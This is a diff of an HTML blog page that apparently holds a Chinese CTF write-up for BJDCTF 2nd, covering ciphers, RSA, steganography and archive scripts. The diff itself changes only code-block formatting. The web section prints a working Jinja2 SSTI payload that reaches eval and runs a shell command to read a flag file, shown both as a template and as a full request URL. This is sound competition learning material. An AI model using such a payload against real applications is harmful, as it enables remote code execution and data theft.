@@ -602,7 +602,7 @@
 <p>发现这样估计好久都解不完，于是写 jio 本！</p>
 <p>搜了一下压缩包解压的 API，改了一下别人的代码，写了个循环。</p>
 <p>考虑到最后的 flag 套娃很多不方便打开，于是就统一解压到一个相同的目录下好了。</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys
 <span class="token keyword">import</span> os
 <span class="token keyword">import</span> zipfile
 
@@ -636,7 +636,7 @@
         <span class="token keyword">else</span><span class="token punctuation">:</span>
             <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error!'</span><span class="token punctuation">)</span>
             <span class="token keyword">print</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span>
-        i <span class="token operator">+=</span> <span class="token number">1</span></code></pre>
+        i <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>跑了一下发现最后在<code>8L0WifU3G</code>这个目录下，套娃了 299 还是 300个压缩包……</p>
 <p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_targz2.png" alt="Misc_targz2"></p>
 <p>打开得到 flag：</p>
@@ -716,7 +716,7 @@
 <p>突然就发现了规律！</p>
 <p>二进制后四位明显是取了反，前四位中的最低位也取了个反。</p>
 <p>py一下，写了个jio本。</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span>
 s <span class="token operator">=</span> <span class="token string">']U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;'</span>
 output <span class="token operator">=</span> <span class="token string">''</span>
 <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
@@ -725,7 +725,7 @@ output <span class="token operator">=</span> <span class="token string">''</span
     <span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>
     output <span class="token operator">+=</span> temp
 <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>
-<span class="token comment"># BJD{jack_de_hu1b1an_xuede_henHa0}$</span></code></pre>
+<span class="token comment"># BJD{jack_de_hu1b1an_xuede_henHa0}$</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>于是得到 flag 了！</p>
 <p><code>BJD{jack_de_hu1b1an_xuede_henHa0}</code></p>
 <p>嘤 要好好学汇编呢（</p>
@@ -733,7 +733,7 @@ output <span class="token operator">=</span> <span class="token string">''</span
 <p>看了 WP 发现原来是解密的代码被 IDA 当成是数据了（就是<code>assume ss:dseg, ds:nothing</code> 上面的那一部分）。</p>
 <p>奇怪了我拿 emu8086 模拟器也没看到这一段，还跑死循环了。噢，<strong>本来就没跑到解密那部分代码！</strong></p>
 <p>偷一下出题师傅的源代码，来自<a target="_blank" rel="noopener" href="https://renjikai.com/bjdctf-2-dreamerjack/">这里</a>。</p>
-<pre class="language-assembly" data-language="assembly"><code class="language-assembly">DATAS SEGMENT
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">DATAS SEGMENT
     str1 DB 5dH,55H,5bH,64H,75H,7eH,7cH,74H
     DB 40H,7bH,7aH,40H,77H,6aH,2eH,7dH,2eH
     DB 7eH,71H,40H,67H,6aH,7aH,7bH,7aH,40H
@@ -766,7 +766,7 @@ START:
     MOV AH,4CH
     INT 21H
 CODES ENDS
-    END START</code></pre>
+    END START<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>解密的部分在<code>lop</code>里，果然是和 31（0x1F）做 xor。</p>
 </blockquote>
@@ -783,15 +783,15 @@ CODES ENDS
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</a></p>
 </blockquote>
-<h3 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="Y1nglish-y1ng"></a>Y1nglish-y1ng</h3><pre class="language-none"><code class="language-none">Nkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk zfk uqjk dwcko su dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw.
+<h3 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="Y1nglish-y1ng"></a>Y1nglish-y1ng</h3><pre class="line-numbers language-none"><code class="language-none">Nkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk zfk uqjk dwcko su dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw.
 Q nzo pzjqtv hqttkf zd z fkodzefztd npkt Pzffw Odkkbk azlk qt, pk qo z Izcztkok ufsl Izczt med tsn pk qo tsd bqjqtv qt Izczt, lzwmk Pzffw qot'd z Izcztkok tzlk med pk qo fkzbbw z Izcztkok. Pzffw nsfwkh qt z bznwkf'o suuqak wkzfo zvs, med pk qo tsn nsfwqtv zd z mztw. Pk vkdo z vssh ozbzfw, med pk zbnzwo msffsno lstkw ufsl pqo ufqktho zth tkjkf czwo qd mzaw. Pzffw ozn lk zth azlk zthozdzd dpk ozlk dzmbk. Pk pzo tkjkf msffsnkh lstkw ufsl lk. Npqbk pk nzo kzdqtv, Q zowkh pql ds bkth lk &amp;2. Ds lw oefcfqok, pk vzjk lk dpk lstkw qllkhqzdkbw. 'Q pzjk tkjkf msfffsnkh ztw lstkw ufsl wse,' Pzffw ozqh,'os tsn wse azt czw usf lw hqttkf!' Tsn q nqbb vqjk wse npzd wse nztd.
-MIH{cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw}</code></pre>
+MIH{cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>整了半天不知道咋办，最后想起来还有个词频大法！</p>
 <p>搜了一下，<a target="_blank" rel="noopener" href="https://quipqiup.com/">这个网站</a> 可以分析词频。</p>
 <p><img src="/2020/03/23/CTF_BJDCTF2nd/Crypto_Yinglish.png" alt="quipquip"></p>
 <p>很明显<code>MIH</code>对应着<code>BJD</code>。下面最像的就是这个了。</p>
-<pre class="language-none"><code class="language-none">Welcome to our competition. Our competition is mainly for freshmen and sophomores. There are five types of topics in this competition, each of which is very basic. If you are interested in networy security, welcome to participate. Let me tell you a story. I was having dinner at a restaurant when Harry Steele came in, he is a Japanese from Japan but now he is not living in Japan, maybe Harry isn't a Japanese name but he is really a Japanese. Harry woryed in a lawyer's office years ago, but he is now worying at a bany. He gets a good salary, but he always borrows money from his friends and never pays it bacy. Harry saw me and came andsatat the same table. He has never borrowed money from me. While he was eating, I asyed him to lend me &amp;2. To my surprise, he gave me the money immediately. 'I have never borrrowed any money from you,' Harry said,'so now you can pay for my dinner!' Now i will give you what you want. 
-BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy}</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">Welcome to our competition. Our competition is mainly for freshmen and sophomores. There are five types of topics in this competition, each of which is very basic. If you are interested in networy security, welcome to participate. Let me tell you a story. I was having dinner at a restaurant when Harry Steele came in, he is a Japanese from Japan but now he is not living in Japan, maybe Harry isn't a Japanese name but he is really a Japanese. Harry woryed in a lawyer's office years ago, but he is now worying at a bany. He gets a good salary, but he always borrows money from his friends and never pays it bacy. Harry saw me and came andsatat the same table. He has never borrowed money from me. While he was eating, I asyed him to lend me &amp;2. To my surprise, he gave me the money immediately. 'I have never borrrowed any money from you,' Harry said,'so now you can pay for my dinner!' Now i will give you what you want. 
+BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>然而交上去不对。。</p>
 <p>看了 hint 说</p>
 <blockquote>
@@ -804,7 +804,7 @@ BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy}</code></pre>
 <p>8*10，想到是8位的 ASCII，10个字符。</p>
 <p>01000010 果然是 <code>B</code></p>
 <p>01111011 果然是 <code>{</code>，之后是</p>
-<pre class="language-none"><code class="language-none">01001101 00100001 01100001 00110000 01111110 01111101</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">01001101 00100001 01100001 00110000 01111110 01111101<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>于是得到flag：<code>BJD{M!a0~}</code></p>
 <p>真的是喵喵呀！</p>
 <h3 id="灵能精通-y1ng"><a href="#灵能精通-y1ng" class="headerlink" title="灵能精通-y1ng"></a>灵能精通-y1ng</h3><blockquote>
@@ -816,7 +816,7 @@ BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy}</code></pre>
 <p><img src="/2020/03/23/CTF_BJDCTF2nd/Templar_cipher.png" alt="Templar Cipher"></p>
 <p>得到 <code>IMKNIGHTSTEMPLAR</code></p>
 <p>最终 flag 为 <code>flag{IMKNIGHTSTEMPLAR}</code>。</p>
-<h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><pre class="language-none"><code class="language-none">罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝</code></pre>
+<h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><pre class="line-numbers language-none"><code class="language-none">罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这题还以为是佛曰，结果发现不是……</p>
 <p>看到别人提示发现真的蠢，下次先拿去给翻译读一遍就知道 flag 了。</p>
 <p><img src="/2020/03/23/CTF_BJDCTF2nd/Crypto_old_illiterate.png" alt="Crypto_old_illiterate"></p>
@@ -824,7 +824,7 @@ BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy}</code></pre>
 <p>flag 是 <code>BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}</code>。</p>
 <h3 id="圣火昭昭-y1ng"><a href="#圣火昭昭-y1ng" class="headerlink" title="圣火昭昭-y1ng"></a>圣火昭昭-y1ng</h3><p>这个是佛曰了，不过是新佛曰。</p>
 <p><img src="/2020/03/23/CTF_BJDCTF2nd/Crypto_Shenghuozhaozhao.png" alt="Crypto_Shenghuozhaozhao"></p>
-<pre class="language-none"><code class="language-none">新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>找了半天没找到解密网站。。来，收藏夹请。</p>
 <blockquote>
 <p>新佛曰：<a target="_blank" rel="noopener" href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></p>
@@ -844,21 +844,21 @@ BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy}</code></pre>
 <blockquote>
 <p>OutGuess is a universal steganographic tool that allows the insertion<br>of hidden information into the redundant bits of data sources.  The<br>nature of the data source is irrelevant to the core of OutGuess.  The<br>program relies on data specific handlers that will extract redundant<br>bits and write them back after modification.  In this version the PNM<br>and JPEG image formats are supported.  In the next paragraphs, images<br>will be used as concrete example of data objects, though OutGuess can<br>use any kind of data, as long as a handler is provided.</p>
 </blockquote>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/crorvick/outguess.git
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/crorvick/outguess.git
 <span class="token builtin class-name">cd</span> outguess
-./configure <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span></code></pre>
+./configure <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>（可能需要 sudo</p>
 <p>常用的指令就加密和解密了。</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">outguess -k <span class="token string">"my secret key"</span> -d hidden.txt demo.jpg out.jpg  <span class="token comment"># 加密</span>
-outguess -k <span class="token string">"my secret key"</span> -r out.jpg hidden.txt  <span class="token comment"># 解密</span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">outguess -k <span class="token string">"my secret key"</span> -d hidden.txt demo.jpg out.jpg  <span class="token comment"># 加密</span>
+outguess -k <span class="token string">"my secret key"</span> -r out.jpg hidden.txt  <span class="token comment"># 解密</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 </blockquote>
-<pre class="language-bash" data-language="bash"><code class="language-bash">outguess -k <span class="token string">"gemlove"</span> -r sheng_huo_zhao_zhao.jpg hidden.txt</code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">outguess -k <span class="token string">"gemlove"</span> -r sheng_huo_zhao_zhao.jpg hidden.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>得到 flag：</p>
 <p> <code>BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</code></p>
 <h3 id="rsa0"><a href="#rsa0" class="headerlink" title="rsa0"></a>rsa0</h3><p>噫？？？<strong>啥时候出的 RSA？没发现……</strong></p>
 <p>来补一下吧。nc 连上，<del>性感xx</del>在线发题。（题目每个环境好像不同）</p>
-<pre class="language-none"><code class="language-none">e=8490247
+<pre class="line-numbers language-none"><code class="language-none">e=8490247
 
 p+q=21369803408498318739708021526026723998776452182678577483200290221438162215918869820587899450236798144391224673258554041165789338090777089646275960540717728
 
@@ -866,28 +866,28 @@ p-q=3061460157102998858829074889635909976695507709525845054360051043005513215448
 
 c=96533573625923830275446881118319408503602914319563862122714988417081897004192103015036939165809559375266874500604915724088338754724344545059907114669824228931409760092764538519264244823654706558401180531000987759255359721495957457449739266870026844498908937249390027970957614362784724540009268878226262563888
 
-flag=??????</code></pre>
+flag=??????<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>分别求得</p>
-<pre class="language-none"><code class="language-none">p = 10837974712104309312795464507495157498223001476815580994318147662869356768731840729282453900889586573188544344301796550035284214997985733590323176918802021
+<pre class="line-numbers language-none"><code class="language-none">p = 10837974712104309312795464507495157498223001476815580994318147662869356768731840729282453900889586573188544344301796550035284214997985733590323176918802021
 
 q = 10531828696394009426912557018531566500553450705862996488882142558568805447187029091305445549347211571202680328956757491130505123092791356055952783621915707
 
 N = 114143693083732767570968317133346423549060454090175301453735671171095767847167710539383793168600011860725545060200762757793552681268747848968704851107766270420356743799632674648383021525392085925089984102330388262453473594582267963382904432339836113984790742410134450191464532864589123878301032917283483243847
 
-d = 50742668784054743796077308928583295672870545303739312689100966737709824813210506078737292591220582907244279005756665043057883285178390377660818970279568204675194935893051526661876109033037071837499249580434595390423343646371583506816678001938953327743693429532902954037961714874373553064053942402868925112743</code></pre>
+d = 50742668784054743796077308928583295672870545303739312689100966737709824813210506078737292591220582907244279005756665043057883285178390377660818970279568204675194935893051526661876109033037071837499249580434595390423343646371583506816678001938953327743693429532902954037961714874373553064053942402868925112743<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>而后利用 <code>m = pow(c, d, p*q)</code> 求得</p>
-<pre class="language-none"><code class="language-none">m=14337636555111949737591403676611178785005554188521046827164791353101910846974617354025302694785689419018</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">m=14337636555111949737591403676611178785005554188521046827164791353101910846974617354025302694785689419018<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>转 Hex 再转 ASCII，得到 flag</p>
 <p><code>flag{656092c1-50bb-459c-89ec-4cabc69b4f3e}</code></p>
 <blockquote>
 <p>也可以用 <code>long_to_bytes</code>（需要安装密码库 <code>pip install pycryptodome</code>）</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> number
-<span class="token keyword">print</span><span class="token punctuation">(</span>number<span class="token punctuation">.</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> number
+<span class="token keyword">print</span><span class="token punctuation">(</span>number<span class="token punctuation">.</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>想起来之前说要装 GitHub 上那个 python 的 <a target="_blank" rel="noopener" href="https://github.com/3summer/CTF-RSA-tool">CTF-RSA-tool</a> 还没装……</p>
 </blockquote>
 <h3 id="rsa1"><a href="#rsa1" class="headerlink" title="rsa1"></a>rsa1</h3><p>nc 连上，得到题目。</p>
-<pre class="language-none"><code class="language-none">e=12907381
+<pre class="line-numbers language-none"><code class="language-none">e=12907381
 
 p^2+q^2=102932491463627835236007836419728692812257769950144692124303780069034558043288683315680953131433063800883414074678408539431834987237784935126939862697346288221662934067206187303336972862679183761578127642359897410735067557329508997996877528676457832325049393014306728671643082858956472153689328530485292574802
 
@@ -895,9 +895,9 @@ p-q=-185309818765397657063788122823542341789780127021615886794410874236918862158
 
 c=30690312081989972161704287726249224946940662102974666523203576217410481202381028355251332967180090326230702940141819337845402788001804202167909768819975074688832043578916709160998681086084701179452449493798807368207904007880376512732622389948601375493793025349147924632369047347529229462962308486909978038157
 
-flag=??????</code></pre>
+flag=??????<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>再来一次</p>
-<pre class="language-none"><code class="language-none">e=10288339
+<pre class="line-numbers language-none"><code class="language-none">e=10288339
 
 p^2+q^2=102932491463627835236007836419728692812257769950144692124303780069034558043288683315680953131433063800883414074678408539431834987237784935126939862697346288221662934067206187303336972862679183761578127642359897410735067557329508997996877528676457832325049393014306728671643082858956472153689328530485292574802
 
@@ -905,7 +905,7 @@ p-q=-185309818765397657063788122823542341789780127021615886794410874236918862158
 
 c=40022015279445190961446033046832809408451288751696588671880831212771863683480569497860194263202064993145631813232350651196681717050659541769219283733622429570927906815646087878932340172422964403729228165631808591658687044189905364508055754933678525530280551473343005313236082014906927913996378291225656288550
 
-flag=??????</code></pre>
+flag=??????<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>p 和 q 不变，则 </p>
 <p>$$<br>n = p*q = \frac{p^2 + q^2 - (p-q)^2}{2}<br>$$</p>
 <p>不变，考虑是<strong>共模攻击</strong>，后面来填坑。<em>（等我装上 RSA tools</em></p>
@@ -914,7 +914,7 @@ flag=??????</code></pre>
 <p><code>&lt;!--ssssssti &amp; a little trick --&gt;</code></p>
 <p>试了一下<code>{{1-1}}</code>可以得到 0，于是就是 SSTI 了。好像都不需要绕过。</p>
 <p>payload：</p>
-<pre class="language-none"><code class="language-none">{% for c in [].__class__.__base__.__subclasses__() %}
+<pre class="line-numbers language-none"><code class="language-none">{% for c in [].__class__.__base__.__subclasses__() %}
 {% if c.__name__ == 'catch_warnings' %}
   {% for b in c.__init__.__globals__.values() %}
   {% if b.__class__ == {}.__class__ %}
@@ -924,8 +924,8 @@ flag=??????</code></pre>
   {% endif %}
   {% endfor %}
 {% endif %}
-{% endfor %}</code></pre>
-<pre class="language-none"><code class="language-none">http://f7ddf918-4b30-4225-b5c9-761bae6f5fdd.node3.buuoj.cn/qaq?name={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}%20%20{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}%20%20{%%20if%20b.__class__%20==%20{}.__class__%20%}%20%20%20%20{%%20if%20%27eval%27%20in%20b.keys()%20%}%20%20%20%20%20%20{{%20b[%27eval%27](%27__import__(%22os%22).popen(%22cd%20/;cat%20flag%22).read()%27)%20}}%20%20%20%20{%%20endif%20%}%20%20{%%20endif%20%}%20%20{%%20endfor%20%}{%%20endif%20%}{%%20endfor%20%}</code></pre>
+{% endfor %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http://f7ddf918-4b30-4225-b5c9-761bae6f5fdd.node3.buuoj.cn/qaq?name={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}%20%20{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}%20%20{%%20if%20b.__class__%20==%20{}.__class__%20%}%20%20%20%20{%%20if%20%27eval%27%20in%20b.keys()%20%}%20%20%20%20%20%20{{%20b[%27eval%27](%27__import__(%22os%22).popen(%22cd%20/;cat%20flag%22).read()%27)%20}}%20%20%20%20{%%20endif%20%}%20%20{%%20endif%20%}%20%20{%%20endfor%20%}{%%20endif%20%}{%%20endfor%20%}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><code>flag{8c252513-5c42-47fd-95b5-4d13a986e6d0}</code></p>
 <p>（貌似是动态 flag</p>
 <h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><p>​    <img src="/2020/03/23/CTF_BJDCTF2nd/Web_elementmaster.jpg" alt="Web_elementmaster"></p>
@@ -1259,12 +1259,12 @@ flag=??????</code></pre>
                         <span class="chip bg-color">Tech</span>
                     </a>
                     
-                    <a href="/tags/Web/">
-                        <span class="chip bg-color">Web</span>
-                    </a>
-                    
                     <a href="/tags/Server/">
                         <span class="chip bg-color">Server</span>
+                    </a>
+                    
+                    <a href="/tags/Web/">
+                        <span class="chip bg-color">Web</span>
                     </a>
                     
                     <a href="/tags/Configuration/">
